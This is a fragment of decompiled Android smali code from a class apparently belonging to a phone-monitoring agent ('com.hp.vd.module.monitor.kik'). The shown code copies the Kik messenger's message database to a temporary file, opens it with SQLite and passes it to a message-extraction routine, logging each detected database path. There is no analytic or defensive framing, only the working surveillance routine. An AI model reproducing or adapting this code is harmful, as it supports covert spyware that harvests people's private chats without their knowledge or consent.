    new-instance v2, Ljava/io/File;

    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 79
    iget-object v3, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "KikMsgExtractor"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "detected: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v1}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " : "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v1}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    invoke-interface {v3, v4, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    const/4 v3, 0x0

    :try_start_0
    const-string v4, "kikMsgTemp"

    const-string v5, "db"

    .line 89
    iget-object v6, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->context:Lcom/hp/vd/context/Context;

    .line 92
    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v6}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v6

    invoke-virtual {v6}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v6

    .line 89
    invoke-static {v4, v5, v6}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v4
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 95
    :try_start_1
    invoke-virtual {p0, v2, v4}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 109
    :try_start_2
    invoke-virtual {v4}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    const/16 v5, 0x10

    invoke-static {v2, v3, v5}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2
    :try_end_2
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_2 .. :try_end_2} :catch_0

    .line 122
    invoke-interface {v1}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p0, v2, v1}, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V

    if-eqz v2, :cond_2

    .line 125
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_2
    if-eqz v4, :cond_1

    .line 128
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto :goto_0

    :catch_0
    move-exception v1

    .line 111
    iget-object v2, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "KikMsgExtractor"

    const-string v5, "Exception caught while opening database."

    invoke-interface {v2, v3, v5, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 113
    invoke-virtual {v4}, Ljava/io/File;->delete()Z

    goto/16 :goto_0

    :catch_1
    move-exception v1

    move-object v3, v4

    goto :goto_1

    :catch_2
    move-exception v1

    .line 97
    :goto_1
    iget-object v4, p0, Lcom/hp/vd/module/monitor/kik/KikMessageExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "KikMsgExtractor"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Exception copying the temp database from:"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ", to: "

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v4, v5, v2, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto/16 :goto_0

    :cond_3
    return-void
.end method

.method protected safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;
    .locals 1

    const/4 v0, 0x0

    .line 326
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 327
    invoke-virtual {p1, p2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    .line 330
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    goto :goto_0

    .line 334
    :cond_0
    :try_start_0
    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 337
    :catch_0
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    :goto_0
    return-object p1
.end method
